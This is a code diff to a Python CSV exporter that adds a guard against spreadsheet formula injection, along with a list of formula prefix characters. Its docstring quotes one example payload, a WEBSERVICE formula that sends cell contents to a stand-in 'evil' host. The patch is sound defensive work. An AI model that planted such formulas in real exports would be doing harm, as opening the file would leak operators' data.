@@ -40,9 +40,38 @@ ENTITIES = (
 )
 
 
+# Leading characters Excel / LibreOffice / Google Sheets interpret as the
+# start of a formula (OWASP "CSV injection"). `\t` and `\r` are included
+# because spreadsheets strip them and evaluate what follows.
+_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _sanitize_cell(value: str) -> str:
+    """Neutralise spreadsheet formula injection (OWASP convention).
+
+    A cell starting with `=`, `+`, `-`, `@`, tab or CR gets a leading
+    single quote, which spreadsheets treat as "literal text" marker. Free
+    text fields (name, description, notes, ...) are the attack surface —
+    a device named `=WEBSERVICE("http://evil/?"&A1)` would otherwise
+    execute when an operator opens the export in Excel. Structured
+    columns (CIDR, IP, MAC, codes, numbers, ISO dates) never start with
+    one of these characters, so they round-trip through export → import
+    unchanged.
+    """
+    if value and value.startswith(_FORMULA_PREFIXES):
+        return "'" + value
+    return value
+
+
 def _line(writer: csv.writer, buffer: io.StringIO, cells: list[str]) -> str:
-    """Write one CSV line, return what was just written and clear the buffer."""
-    writer.writerow(cells)
+    """Write one CSV line, return what was just written and clear the buffer.
+
+    Every cell goes through `_sanitize_cell` — this is the single choke
+    point for all exports (entities, audit log, ZIP bundle), so no writer
+    can forget the formula-injection guard. Header cells are constants
+    that never start with a formula character, so they pass unchanged.
+    """
+    writer.writerow([_sanitize_cell(c) for c in cells])
     out = buffer.getvalue()
     buffer.seek(0)
     buffer.truncate()
